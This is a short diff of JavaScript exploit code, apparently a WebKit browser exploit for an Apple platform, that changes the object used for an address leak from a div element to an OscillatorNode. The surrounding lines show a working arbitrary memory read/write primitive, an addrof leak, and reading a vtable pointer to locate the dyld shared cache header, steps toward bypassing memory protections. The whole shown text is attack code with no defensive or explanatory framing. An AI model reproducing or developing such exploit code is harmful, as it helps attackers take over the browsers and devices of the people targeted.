@@ -628,15 +628,19 @@ var VM_PROT_EXECUTE = 0x4
      
     print("[+] arbitrary memory read/write working");
         var log = print;
-        log('[*] Creating the HTMLDivElement wrapper...');
-        var d = document.createElement('div');
+        //never tried this method...
+        const audioCtx = new AudioContext();
+
+        var oscillator = new OscillatorNode(audioCtx);
+        log('[*] Creating the OscillatorNode wrapper...');
+        var d = oscillator;
         let ad_div = addrof(d);
         log('[+] Address of the div is '+ad_div.toString(16));
         //alert(FPO)
         let exe_ptr = memory.read_i64(Add(ad_div, FPO),0);
         log('[+] Executable instance is at '+exe_ptr.toString(16));
         let v_tlb = memory.read_i64(exe_ptr);
-        log('[+] divelement vtable seems to be at '+v_tlb.toString(16));
+        log('[+] Oscillator vtable seems to be at '+v_tlb.toString(16));
         var anchor = memory.read_i64(v_tlb)
         var hdr = Sub(anchor, anchor.lo() & 0xfff);
         log('dyld cache header @' + hdr); //dyld_cache_header
